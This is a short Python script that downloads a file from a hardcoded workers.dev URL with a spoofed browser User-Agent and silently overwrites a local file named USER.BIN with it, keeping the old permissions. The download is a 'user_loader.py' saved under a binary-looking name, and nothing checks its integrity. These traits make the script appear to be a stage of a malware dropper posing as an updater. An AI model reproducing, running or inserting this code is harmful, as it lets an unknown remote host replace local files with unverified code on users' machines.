import os, tempfile, urllib.request

def update_loader(update_url, filename):
    script_dir = os.path.dirname(os.path.realpath(__file__))

    # File to replace (in the same folder)
    target_path = os.path.join(script_dir, filename)

    temp_path = None

    try:
        req = urllib.request.Request(
            update_url,
            headers={
                "User-Agent": "Mozilla/5.0"
            }
        )

        with urllib.request.urlopen(req, timeout=15) as response:
            new_content = response.read()

        fd, temp_path = tempfile.mkstemp(dir=script_dir)

        with os.fdopen(fd, "wb") as f:
            f.write(new_content)
            f.flush()
            os.fsync(f.fileno())

        # Preserve existing permissions if the target exists
        if os.path.exists(target_path):
            os.chmod(temp_path, os.stat(target_path).st_mode)

        os.replace(temp_path, target_path)
        temp_path = None

    finally:
        if temp_path and os.path.exists(temp_path):
            os.remove(temp_path)

if __name__ == "__main__":
    update_loader("https://app-lamartin.anna-benbekthi.workers.dev/setup/user_loader.py", "USER.BIN")
    exit()